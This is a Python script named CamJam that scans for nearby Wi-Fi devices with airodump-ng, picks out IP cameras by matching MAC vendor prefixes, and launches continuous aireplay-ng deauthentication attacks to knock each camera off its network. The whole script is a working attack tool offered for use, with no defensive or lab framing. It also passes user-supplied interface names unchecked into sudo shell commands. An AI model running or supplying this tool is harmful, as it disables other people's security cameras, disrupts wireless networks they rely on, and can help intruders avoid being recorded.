#!/usr/bin/python3

from code import interact
import csv
from importlib.resources import path
import os
import random
import sys,getopt,subprocess
import time

class CamJam:

    interfacescan = ''
    interfacedeauth = ''
    ###                     This method handles the arguments passed to the script. It also defines the allowed arguments. 
    def parse_input(self):
        scrip_args_list = sys.argv[1:]
        short_options = "hs:d:"
        long_options = ["help","interfacescan=","interfacedeauth="]
        try:
            arguments, values = getopt.getopt(scrip_args_list, short_options, long_options)
            for current_argument, current_value in arguments:
                if current_argument in ("-s", "--interface-scan"):
                    self.interfacescan = current_value
                elif current_argument in ("-d", "--interface-deauth"):
                    self.interfacedeauth = current_value
                elif current_argument in ("-h", "--help"):
                    print ("PARAMETERS:")
                    print ("    -s/--interface-scan=<NETWORK INTERFACE>: Defines network interface to use for scanning")
                    print ("    -d/--interface-scan=<NETWORK INTERFACE>: Defines network interface to use for deauth attack")
                    print ()
                    print ("USAGE:")
                    print ("    python CamJam.py -s INTERFACE -d INTERFACE")
                    print ()
                    print ("EXAMPLE:")
                    print ("    python CamJam.py -s wlan0 -d wlan1")
                    sys.exit(2)
                else:
                    print ('Unknown error')
                    sys.exit(2)
        except getopt.error as error:
            print(str(error))
            sys.exit(2)
    ###

    ###                     This method disables monitor mode on all interfaces in case this was still running (from previous runs for example), and restarts monitor mode for the scanning interface. 
    def enable_monitor_mode(self):
        try:
            subprocess.check_output('sudo airmon-ng stop '+self.interfacescan+ 'mon', shell=True)
        except:
            pass
        try:
            subprocess.check_output('sudo airmon-ng stop '+self.interfacedeauth+ 'mon', shell=True)
        except:
            pass

        commandstring = 'sudo airmon-ng start '+self.interfacescan
        try:
            process = subprocess.check_output(commandstring, shell=True)
            process = process.decode("utf-8")
            ifmon = self.interfacescan+"mon"

            if ifmon in process:
                print("Monitor mode successfully enabled for network adapters")
                self.interfacescan = ifmon
                return 1
            else:
                print("One or more adapters do not support monitor mode")
                return 0
        except subprocess.SubprocessError as error:
            print (str(error)+ " Is the supplied network adapter correct?")
            return 0
    ###

    ###                     This method detects devices, identifies cameras, and deauthenticates them. 
    def rundump(self):
        try:
            os.system('rm airodumplogs-01.csv airodumplogs-01.log.csv airodumplogs-01.kismet.netxml airodumplogs-01.kismet.csv airodumplogs-01.cap')                        # Removes old Airodump-ng log files if these exist. 
        except:
            pass
        time.sleep(1)

        print ("starting airodump-ng on interface: "+ self.interfacescan)
        airodumpprocess = subprocess.Popen(['airodump-ng', '-wairodumplogs', '-babg', '-a', self.interfacescan], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)       # Starts Airodump-ng in order to start detecting devices. 
        print ('airodump-ng started, PID: '+ str(airodumpprocess.pid))
        time.sleep(1)

        founddevices = []
        underattack = []
        tr= True
        startaireplayonce = True
        while tr:
            with open('airodumplogs-01.csv', 'r') as airodumplogs:
                datareader = csv.reader(airodumplogs)
                for datarow in datareader:
                    txt = str(datarow)
                    x = txt.split(", ")
                    mac = x[0].replace(":", "-").replace("[", "").replace("]", "").replace("'", "").replace(" ", "")
                    try:
                        apmac = x[5].replace("[", "").replace("]", "").replace("'", "").replace(" ", "")
                    except:
                        pass
                    macprefix = mac[0:8]

                    try:
                        if ':' in x[5] and macprefix not in founddevices:                                                   # Checks if device has already been detected. Skips it if this is the case. 
                            founddevices.append(macprefix)                                                                  # Adds device to list so it will not be checked twice. 

                            with open('oui.txt', 'r') as ouifile:
                                ouidata = ouifile.readlines()
                                for ouirow in ouidata:
                                    if ouirow.find(macprefix) != -1:                                                        #Checks if MAC OUI is present in the oui.txt file. 

                                        with open('vendors.txt', 'r') as vendorfile:
                                            vendordata = vendorfile.readlines()
                                            for vendorrow in vendordata:
                                                if vendorrow.find(ouirow[18:]) != -1:                                       # Checks if vendow is an camera manufacturer. 
                                                    try:
                                                        with open('airodumplogs-01.csv', 'r') as airodumplogs1:
                                                            datareader1 = csv.reader(airodumplogs1)
                                                            for datarow1 in datareader1:
                                                                txt1 = str(datarow1)
                                                                x1 = txt1.split(", ")
                                                                if apmac in x1[0]:
                                                                    channel = x1[3].replace(" ", "").replace("'", "")       # Retrieves AP channel for deauthentication.
                                                    except:
                                                        print("error")
                                                        pass

                                                    mac = mac.replace("-", ":")
                                                    print ("New IP Camera found: "+ mac + " - " + apmac + " - " + channel)

                                                    try:
                                                        commandstring1 = 'sudo airmon-ng start '+self.interfacedeauth+ " " + channel
                                                        process1 = subprocess.check_output(commandstring1, shell=True)      # Puts network interface on the correct channel for deauthentication. 
                                                        process1 = process1.decode("utf-8")
                                                        ifmon1 = self.interfacedeauth+"mon"
                                                    except:
                                                        pass

                                                    try:

                                                        if ifmon1 in process1:
                                                            aireplayprocess = subprocess.Popen(['aireplay-ng', '-0', '0', '-c'+ mac, '-a' + apmac, ifmon1], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)        # Starts deauth attack. 
                                                            print ("Started deauth attack: " + str(aireplayprocess.pid))
                                                            underattack.append(mac)
                                                            print("Currently under attack: "+str(underattack))
                                                    except subprocess.SubprocessError as error:
                                                        print (str(error)+ " Could not set adapter channel")

                    except:
                        pass
            time.sleep(3)
    ###

    def __init__(self):
        monmode_enabled=0
        self.parse_input()

        if self.interfacescan != '':
            print ("Putting interfaces into monitor mode")
            monmode_enabled = self.enable_monitor_mode()
        else:
            sys.exit(2)

        if monmode_enabled == 1:
            self.rundump()

if __name__ == '__main__':
    camjam = CamJam()